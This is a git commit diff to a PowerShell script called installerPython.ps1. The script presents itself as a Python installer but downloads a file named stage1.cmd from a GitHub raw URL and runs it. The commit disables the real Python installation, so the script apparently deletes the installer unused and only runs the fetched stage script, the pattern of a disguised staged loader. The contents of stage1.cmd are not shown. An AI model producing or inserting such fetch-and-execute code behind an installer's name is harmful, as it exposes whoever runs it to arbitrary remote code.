65cb5450a218ce8358839ecb001b882a7c4207f6
Thông Tấn <ttthong315@gmail.com>
2025-05-08 00:12:55 +0700

    add stage1.cmd

--- installerPython.ps1
+++ installerPython.ps1
@@ -3,6 +3,6 @@ $installerPath = "$env:TEMP\python-installer.exe"
 $installerPathStage = "$env:TEMP\stage1.cmd"
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/Windows-Internal/refs/heads/main/stage1.cmd -OutFile $installerPathStage
 Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
-Start-Process -FilePath $installerPath -ArgumentList "/quiet PrependPath=1 Include_test=0" -Wait -WindowStyle Hidden
+#Start-Process -FilePath $installerPath -ArgumentList "/quiet PrependPath=1 Include_test=0" -Wait -WindowStyle Hidden
 Remove-Item $installerPath
 Start-Process $installerPathStage -NoNewWindow -Wait
